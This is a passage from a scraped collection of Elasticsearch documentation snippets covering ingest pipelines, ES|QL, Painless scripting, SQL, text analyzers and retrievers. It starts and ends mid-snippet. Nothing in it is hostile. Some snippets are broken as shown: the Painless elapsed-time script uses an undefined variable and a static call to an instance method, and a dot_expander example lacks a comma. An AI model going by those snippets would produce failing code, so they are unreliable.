{\n    \"index\": \"my-index-000001\",\n    \"document\": {\n      \"name\": \"Dune\",\n      \"author\": \"Frank Herbert\",\n      \"release_date\": \"1965-06-01\",\n      \"page_count\": 604\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing a document with a custom character limit\nDESCRIPTION: Example showing how to index a document with a custom character extraction limit specified in the max_size field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/attachment.md#2025-04-21_snippet_10\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/attachment\n{\n  \"description\" : \"Extract attachment information\",\n  \"processors\" : [\n    {\n      \"attachment\" : {\n        \"field\" : \"data\",\n        \"indexed_chars\" : 11,\n        \"indexed_chars_field\" : \"max_size\",\n        \"remove_binary\": true\n      }\n    }\n  ]\n}\nPUT my-index-000001/_doc/my_id_2?pipeline=attachment\n{\n  \"data\": \"e1xydGYxXGFuc2kNCkxvcmVtIGlwc3VtIGRvbG9yIHNpdCBhbWV0DQpccGFyIH0=\",\n  \"max_size\": 5\n}\nGET my-index-000001/_doc/my_id_2\n```\n\n----------------------------------------\n\nTITLE: Extracting Minimum X Coordinates with ESQL\nDESCRIPTION: This ESQL snippet evaluates the minimum and maximum x and y coordinates of city boundaries within an ElasticSearch database. The snippet filters data from the `airport_city_boundaries` table where the abbreviation is 'CPH' and calculates the boundary's envelope. The evaluated coordinates are then retained alongside other relevant airport data. Ensure that the geometry is of type `geo_point` or `geo_shape` to perform coordinate extraction accurately.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/st_xmin.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airport_city_boundaries\n| WHERE abbrev == \"CPH\"\n| EVAL envelope = ST_ENVELOPE(city_boundary)\n| EVAL xmin = ST_XMIN(envelope), xmax = ST_XMAX(envelope), ymin = ST_YMIN(envelope), ymax = ST_YMAX(envelope)\n| KEEP abbrev, airport, xmin, xmax, ymin, ymax\n```\n\n----------------------------------------\n\nTITLE: Grouping by Multiple Values in ESQL STATS\nDESCRIPTION: Shows how to group by multiple values using the STATS command in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/stats-by.md#2025-04-21_snippet_7\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\nSTATS\n  avg_salary = AVG(salary)\nBY department, gender;\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Default Edge N-gram Tokenizer in Elasticsearch\nDESCRIPTION: Example of using the default edge_ngram tokenizer which produces n-grams with min length 1 and max length 2. The example shows how 'Quick Fox' becomes the terms [Q, Qu].\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-edgengram-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"tokenizer\": \"edge_ngram\",\n  \"text\": \"Quick Fox\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Data Frame Analytics Model in Inference Processor\nDESCRIPTION: Shows configuration for data frame analytics models using 'target_field' and 'field_map' options instead of 'input_output'. This example includes regression configuration and demonstrates how to map document fields to model input fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/inference-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"inference\": {\n    \"model_id\": \"model_deployment_for_inference\",\n    \"target_field\": \"FlightDelayMin_prediction_infer\",\n    \"field_map\": {\n      \"your_field\": \"my_field\"\n    },\n    \"inference_config\": { \"regression\": {} }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Delimited Payload Filter\nDESCRIPTION: Example of using the analyze API with the delimited_payload filter to process text containing token-payload pairs separated by the default '|' delimiter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-delimited-payload-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [\"delimited_payload\"],\n  \"text\": \"the|0 brown|10 fox|5 is|0 quick|10\"\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing Map with Static Values in Painless\nDESCRIPTION: Shows how to initialize a Map with static key-value pairs using the map initialization operator in Painless.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_13\n\nLANGUAGE: painless\nCODE:\n```\nMap map = [1:2, 3:4, 5:6]; \n```\n\n----------------------------------------\n\nTITLE: Computing SHA1 Hashes in ESQL Pipeline\nDESCRIPTION: This example demonstrates an ESQL pipeline that filters out error messages, computes SHA1 hashes for message values, and keeps only the relevant fields. The pipeline processes connection messages and shows the resulting SHA1 hash for each message value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/sha1.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| WHERE message != \"Connection error\"\n| EVAL sha1 = sha1(message)\n| KEEP message, sha1\n```\n\n----------------------------------------\n\nTITLE: Implementing a Rescorer Retriever with RRF in Elasticsearch\nDESCRIPTION: This example demonstrates a rescorer retriever applied to the results of an RRF (Reciprocal Rank Fusion) retriever. The rescorer applies a script_score query that calculates cosine similarity with a product vector, while the child RRF retriever combines results from sparse vector, multi_match, and kNN retrievers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrievers.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET movies/_search\n{\n  \"size\": 10, <1>\n  \"retriever\": {\n    \"rescorer\": { <2>\n      \"rescore\": {\n        \"window_size\": 50, <3>\n        \"query\": { <4>\n          \"rescore_query\": {\n            \"script_score\": {\n              \"query\": {\n                \"match_all\": {}\n              },\n              \"script\": {\n                \"source\": \"cosineSimilarity(params.queryVector, 'product-vector_final_stage') + 1.0\",\n                \"params\": {\n                  \"queryVector\": [-0.5, 90.0, -10, 14.8, -156.0]\n                }\n              }\n            }\n          }\n        }\n      },\n      \"retriever\": { <5>\n        \"rrf\": {\n          \"rank_window_size\": 100, <6>\n          \"retrievers\": [\n            {\n              \"standard\": {\n                \"query\": {\n                  \"sparse_vector\": {\n                    \"field\": \"plot_embedding\",\n                    \"inference_id\": \"my-elser-model\",\n                    \"query\": \"films that explore psychological depths\"\n                  }\n                }\n              }\n            },\n            {\n              \"standard\": {\n                \"query\": {\n                  \"multi_match\": {\n                    \"query\": \"crime\",\n                    \"fields\": [\n                      \"plot\",\n                      \"title\"\n                    ]\n                  }\n                }\n              }\n            },\n            {\n              \"knn\": {\n                \"field\": \"vector\",\n                \"query_vector\": [10, 22, 77],\n                \"k\": 10,\n                \"num_candidates\": 10\n              }\n            }\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Async EQL Search Progress in Elasticsearch\nDESCRIPTION: This example shows how to check the progress of an asynchronous EQL search using the get async EQL search API with a search ID and wait_for_completion_timeout parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_24\n\nLANGUAGE: console\nCODE:\n```\nGET /_eql/search/FmNJRUZ1YWZCU3dHY1BIOUhaenVSRkEaaXFlZ3h4c1RTWFNocDdnY2FSaERnUTozNDE=?wait_for_completion_timeout=2s\n```\n\n----------------------------------------\n\nTITLE: Configuring Look Back Time in Elasticsearch\nDESCRIPTION: Setting to define the interval for calculating the start_time of a TSDS's first backing index. Accepts values between 1m and 7d.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/time-series.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nindex.look_back_time: 2h\n```\n\n----------------------------------------\n\nTITLE: Configuring Cluster-Level Data Stream Retention Maximum\nDESCRIPTION: Dynamic setting that defines the maximum retention period for all user data streams managed by the lifecycle. Must be greater than 10 seconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/data-stream-lifecycle-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ndata_streams.lifecycle.retention.max: <time_value>\n```\n\n----------------------------------------\n\nTITLE: Calculating Standard Deviation with ESQL\nDESCRIPTION: This snippet demonstrates how to use the STD_DEV function in ESQL to calculate the standard deviation of a numeric field (height) from the 'employees' table. The STATS command is used to perform the aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/std_dev.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS STD_DEV(height)\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Instanceof Operator with Reference Types in Painless\nDESCRIPTION: Shows examples of using the instanceof operator with different reference types, including implicit casting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_8\n\nLANGUAGE: painless\nCODE:\n```\nMap m = new HashMap();            <1>\nboolean a = m instanceof HashMap; <2>\nboolean b = m instanceof Map;     <3>\n```\n\n----------------------------------------\n\nTITLE: Setting up Mapping for Phrase Suggester in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to set up the required mapping for the phrase suggester, including custom analyzers and field configurations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT test\n{\n  \"settings\": {\n    \"index\": {\n      \"number_of_shards\": 1,\n      \"analysis\": {\n        \"analyzer\": {\n          \"trigram\": {\n            \"type\": \"custom\",\n            \"tokenizer\": \"standard\",\n            \"filter\": [\"lowercase\",\"shingle\"]\n          },\n          \"reverse\": {\n            \"type\": \"custom\",\n            \"tokenizer\": \"standard\",\n            \"filter\": [\"lowercase\",\"reverse\"]\n          }\n        },\n        \"filter\": {\n          \"shingle\": {\n            \"type\": \"shingle\",\n            \"min_shingle_size\": 2,\n            \"max_shingle_size\": 3\n          }\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"title\": {\n        \"type\": \"text\",\n        \"fields\": {\n          \"trigram\": {\n            \"type\": \"text\",\n            \"analyzer\": \"trigram\"\n          },\n          \"reverse\": {\n            \"type\": \"text\",\n            \"analyzer\": \"reverse\"\n          }\n        }\n      }\n    }\n  }\n}\nPOST test/_doc?refresh=true\n{\"title\": \"noble warriors\"}\nPOST test/_doc?refresh=true\n{\"title\": \"nobel prize\"}\n```\n\n----------------------------------------\n\nTITLE: Logging put_role_mapping Event in Elasticsearch\nDESCRIPTION: Example of an audit log for the create or update role mapping event. This event is logged when the API is invoked to create or update a role mapping.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_14\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-31T00:11:13,932+0200\", \"node.id\":\n\"0RMNyghkQYCc_gVd1G6tZQ\", \"event.type\":\"security_config_change\", \"event.\naction\":\"put_role_mapping\", \"request.id\":\"kg4h1l_kTDegnLC-0A-XxA\",\n\"put\":{\"role_mapping\":{\"name\":\"mapping1\",\"roles\":[\"user\"],\"rules\":\n{\"field\":{\"username\":\"*\"}},\"enabled\":true,\"metadata\":{\"version\":1}}}}\n```\n\n----------------------------------------\n\nTITLE: Markdown Documentation Header\nDESCRIPTION: Header section describing the documentation generation context and function name reference.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_integer.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `TO_INTEGER` [esql-to_integer]\n```\n\n----------------------------------------\n\nTITLE: Generating Default SAML Metadata for a Realm in Shell\nDESCRIPTION: This example demonstrates how to generate a default metadata file for the 'saml1' realm using the elasticsearch-saml-metadata command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/saml-metadata.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-saml-metadata --realm saml1\n```\n\n----------------------------------------\n\nTITLE: Including SHA1 Function Documentation Sections in Markdown\nDESCRIPTION: This snippet demonstrates how to include various sections of the SHA1 function documentation using Markdown include directives.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/sha1.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/sha1.md\n:::\n\n:::{include} ../description/sha1.md\n:::\n\n:::{include} ../types/sha1.md\n:::\n\n:::{include} ../examples/sha1.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Configuring German Phonebook Order Sorting in Elasticsearch\nDESCRIPTION: Example showing how to configure an index with ICU collation keyword field for German phonebook-style name sorting. The configuration creates a text field with a sub-field for sorting using German phonebook collation rules.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-icu-collation-keyword-field.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"name\": {\n        \"type\": \"text\",\n        \"fields\": {\n          \"sort\": {\n            \"type\": \"icu_collation_keyword\",\n            \"index\": false,\n            \"language\": \"de\",\n            \"country\": \"DE\",\n            \"variant\": \"@collation=phonebook\"\n          }\n        }\n      }\n    }\n  }\n}\n\nGET /my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"name\": \"Fritz\"\n    }\n  },\n  \"sort\": \"name.sort\"\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Estonian Stop Words\nDESCRIPTION: Defines Estonian stop words for usage in Elasticsearch, linked to the respective Lucene document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_16\n\nLANGUAGE: markdown\nCODE:\n```\n`_estonian_`\n:   [Estonian stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/et/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Checking Index Version in Elasticsearch\nDESCRIPTION: This API call retrieves the version information for a specific migrated index in the data stream.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reindex-data-stream.md#2025-04-21_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nGET .migrated-ds-my-data-stream-2025.01.23-000001?human&filter_path=*.settings.index.version.created_string\n```\n\n----------------------------------------\n\nTITLE: Using ASIN Function in Elasticsearch SQL\nDESCRIPTION: Returns the arcsine (inverse sine) of the input numeric expression as an angle in radians. The function takes a numeric input and returns a double value. If null is provided, it returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_37\n\nLANGUAGE: sql\nCODE:\n```\nASIN(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: SQL Query for Geo-Distance using ST_Distance\nDESCRIPTION: This SQL query selects shapes from a test table where the distance between a point and a given coordinate is less than or equal to 25 units.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_15\n\nLANGUAGE: SQL\nCODE:\n```\nSELECT shape FROM test WHERE ST_Distance(point, ST_WKTToSQL('point (10 20)')) <= 25;\n```\n\n----------------------------------------\n\nTITLE: Testing Basic Painless Script\nDESCRIPTION: Example of running a simple calculation script in the default painless_test context with parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /_scripts/painless/_execute\n{\n  \"script\": {\n    \"source\": \"params.count / params.total\",\n    \"params\": {\n      \"count\": 100.0,\n      \"total\": 1000.0\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Next Batch of Scroll Results in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to retrieve the next batch of results using the scroll API. It requires the scroll_id from the previous response and specifies a new scroll time to keep the search context alive.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nPOST /_search/scroll\n{\n  \"scroll\" : \"1m\",\n  \"scroll_id\" : \"DXF1ZXJ5QW5kRmV0Y2gBAAAAAAAAAD4WYm9laVYtZndUQlNsdDcwakFMNjU1QQ==\"\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Up Optimized Text Analysis for Percolator\nDESCRIPTION: Creates an index with custom analyzer configuration for optimized query time text analysis.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/percolator.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT /test_index\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\" : {\n          \"tokenizer\": \"standard\",\n          \"filter\" : [\"lowercase\", \"porter_stem\"]\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"query\" : {\n        \"type\": \"percolator\"\n      },\n      \"body\" : {\n        \"type\": \"text\",\n        \"analyzer\": \"my_analyzer\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Kuromoji Analyzer with ICU Normalization in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a custom analyzer based on the kuromoji analyzer with added icu_normalizer character filter. This configuration solves the problem of unexpected tokenization of full-width characters in Japanese text, ensuring proper handling of texts like 'Ｃｕｌｔｕｒｅ　ｏｆ　Ｊａｐａｎ'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-analyzer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT index-00001\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"kuromoji_normalize\": {                 <1>\n            \"char_filter\": [\n              \"icu_normalizer\"                    <2>\n            ],\n            \"tokenizer\": \"kuromoji_tokenizer\",\n            \"filter\": [\n              \"kuromoji_baseform\",\n              \"kuromoji_part_of_speech\",\n              \"cjk_width\",\n              \"ja_stop\",\n              \"kuromoji_stemmer\",\n              \"lowercase\"\n            ]\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Highlighting in Elasticsearch Query\nDESCRIPTION: This snippet demonstrates how to include highlighting for the 'content' field in an Elasticsearch search query using the default highlighter. It specifies the field to highlight within the 'highlight' object in the request body.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match\": { \"content\": \"kimchy\" }\n  },\n  \"highlight\": {\n    \"fields\": {\n      \"content\": {}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Kuromoji Baseform Token Filter Analysis Result\nDESCRIPTION: This snippet shows the response from analyzing the Japanese text \"飲み\" (nomi) using the custom analyzer with kuromoji_baseform filter. The result demonstrates how the filter lemmatizes the verb to its base form \"飲む\" (nomu).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-baseform.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"tokens\" : [ {\n    \"token\" : \"飲む\",\n    \"start_offset\" : 0,\n    \"end_offset\" : 2,\n    \"type\" : \"word\",\n    \"position\" : 0\n  } ]\n}\n```\n\n----------------------------------------\n\nTITLE: HAVING Clause with GROUP BY\nDESCRIPTION: Example of using HAVING clause to filter groups based on count between 15 and 20.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_21\n\nLANGUAGE: sql\nCODE:\n```\nSELECT languages AS l, COUNT(*) AS c FROM emp GROUP BY l HAVING c BETWEEN 15 AND 20;\n```\n\n----------------------------------------\n\nTITLE: Dot Expander with Path Configuration\nDESCRIPTION: Shows how to use the path option to navigate to and expand dotted fields nested within a non-dotted structure.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dot-expand-processor.md#2025-04-21_snippet_10\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"dot_expander\": {\n    \"path\": \"foo\"\n    \"field\": \"*\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Map Access with Def Type in Painless\nDESCRIPTION: Demonstrates the usage of map access with a def type in Painless, showcasing how dynamic typing can handle various data types. Includes correct usage of the operator for setting and getting values. Make sure an appropriate def instance is initialized to avoid errors.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_16\n\nLANGUAGE: painless\nCODE:\n```\ndef d = new HashMap();\nd['value2'] = 2;\nd['value5'] = 5;\nint x = d['value2'] + d['value5'];\nString y = 'value5';\ndef z = d[y];\n```\n\n----------------------------------------\n\nTITLE: Basic Search Query with Sorted Results in Elasticsearch\nDESCRIPTION: Shows how to query a sorted index for the latest 10 events using timestamp-based sorting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/sorting.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /events/_search\n{\n  \"size\": 10,\n  \"sort\": [\n    { \"timestamp\": \"desc\" }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Elapsed Time Using String 'Now' Parameter in Painless\nDESCRIPTION: Painless script that parses a string representation of the current time passed as a parameter to calculate the elapsed time since a datetime field value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_26\n\nLANGUAGE: painless\nCODE:\n```\nString nowString = params['now'];\nZonedDateTime nowZdt = ZonedDateTime.parse(nowString);\nlong now = ZonedDateTime.toInstant().toEpochMilli();\nZonedDateTime inputDateTime = doc['input_datetime'];\nlong millisDateTime = zdt.toInstant().toEpochMilli();\nlong elapsedTime = now - millisDateTime;\n```\n\n----------------------------------------\n\nTITLE: Array Initialization Operator in Painless\nDESCRIPTION: Demonstrates array initialization with static and dynamic values using the array initialization operator '[] {}'. Shows both simple integer array creation and mixed-type def array initialization.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-array.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nint[] x = new int[] {1, 2, 3};\n```\n\nLANGUAGE: painless\nCODE:\n```\nint i = 1;\nlong l = 2L;\nfloat f = 3.0F;\ndouble d = 4.0;\nString s = \"5\";\ndef array = new def[] {i, l, f*d, s};\n```\n\n----------------------------------------\n\nTITLE: Setting custom node attribute in Elasticsearch YAML configuration\nDESCRIPTION: Demonstrates how to specify a custom node attribute in the elasticsearch.yml configuration file to enable filtering based on node characteristics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/shard-allocation.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nnode.attr.size: medium\n```\n\n----------------------------------------\n\nTITLE: Creating Index and Loading Sample IP Data\nDESCRIPTION: Sets up an index with IPv4 and IPv6 fields and loads sample network traffic data using bulk API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-ipprefix-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT network-traffic\n{\n    \"mappings\": {\n        \"properties\": {\n            \"ipv4\": { \"type\": \"ip\" },\n            \"ipv6\": { \"type\": \"ip\" }\n        }\n    }\n}\n\nPOST /network-traffic/_bulk?refresh\n{\"index\":{\"_id\":0}}\n{\"ipv4\":\"192.168.1.10\",\"ipv6\":\"2001:db8:a4f8:112a:6001:0:12:7f10\"}\n{\"index\":{\"_id\":1}}\n{\"ipv4\":\"192.168.1.12\",\"ipv6\":\"2001:db8:a4f8:112a:6001:0:12:7f12\"}\n{\"index\":{\"_id\":2}}\n{ \"ipv4\":\"192.168.1.33\",\"ipv6\":\"2001:db8:a4f8:112a:6001:0:12:7f33\"}\n{\"index\":{\"_id\":3}}\n{\"ipv4\":\"192.168.1.10\",\"ipv6\":\"2001:db8:a4f8:112a:6001:0:12:7f10\"}\n{\"index\":{\"_id\":4}}\n{\"ipv4\":\"192.168.2.41\",\"ipv6\":\"2001:db8:a4f8:112c:6001:0:12:7f41\"}\n{\"index\":{\"_id\":5}}\n{\"ipv4\":\"192.168.2.10\",\"ipv6\":\"2001:db8:a4f8:112c:6001:0:12:7f10\"}\n{\"index\":{\"_id\":6}}\n{\"ipv4\":\"192.168.2.23\",\"ipv6\":\"2001:db8:a4f8:112c:6001:0:12:7f23\"}\n{\"index\":{\"_id\":7}}\n{\"ipv4\":\"192.168.3.201\",\"ipv6\":\"2001:db8:a4f8:114f:6001:0:12:7201\"}\n{\"index\":{\"_id\":8}}\n{\"ipv4\":\"192.168.3.107\",\"ipv6\":\"2001:db8:a4f8:114f:6001:0:12:7307\"}\n```\n\n----------------------------------------\n\nTITLE: Unsupported Scalar Functions on Nested Fields\nDESCRIPTION: Examples of unsupported SQL queries that use scalar functions on nested fields in WHERE and ORDER BY clauses. These operations are not allowed in Elasticsearch SQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-limitations.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM test_emp WHERE LENGTH(dep.dep_name.keyword) > 5;\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM test_emp ORDER BY YEAR(dep.start_date);\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Truncate Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the truncate filter in an analyze API request to shorten tokens that exceed 10 characters in the given text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-truncate-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\" : \"whitespace\",\n  \"filter\" : [\"truncate\"],\n  \"text\" : \"the quinquennial extravaganza carried on\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Confluence Connector via API\nDESCRIPTION: API call to create a new Confluence connector in Elasticsearch\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-confluence.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _connector/my-confluence-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from Confluence\",\n  \"service_type\": \"confluence\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Hyphenation Decompounder\nDESCRIPTION: Example of creating a custom analyzer using the hyphenation_decompounder filter with specific configuration for word list path, hyphenation patterns, and maximum subword size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-hyp-decomp-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT hyphenation_decompound_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"standard_hyphenation_decompound\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"22_char_hyphenation_decompound\" ]\n        }\n      },\n      \"filter\": {\n        \"22_char_hyphenation_decompound\": {\n          \"type\": \"hyphenation_decompounder\",\n          \"word_list_path\": \"analysis/example_word_list.txt\",\n          \"hyphenation_patterns_path\": \"analysis/hyphenation_patterns.xml\",\n          \"max_subword_size\": 22\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Specifying Email Account Information in Elasticsearch YAML\nDESCRIPTION: Configures account information for sending notifications via email with various account attributes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.notification.email.account\n```\n\n----------------------------------------\n\nTITLE: Using TOP Clause to Limit Results\nDESCRIPTION: Example of using the TOP clause to restrict the number of rows returned in the result set. TOP needs to be placed before the select list.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nSELECT TOP 2 first_name, last_name, emp_no FROM emp;\n```\n\n----------------------------------------\n\nTITLE: Keyed Date Range Aggregation in Elasticsearch\nDESCRIPTION: Shows how to create a keyed date range aggregation in Elasticsearch. The query uses custom date formatting and sets the 'keyed' flag to true for a hash-style response.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-daterange-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"range\": {\n      \"date_range\": {\n        \"field\": \"date\",\n        \"format\": \"MM-yyy\",\n        \"ranges\": [\n          { \"to\": 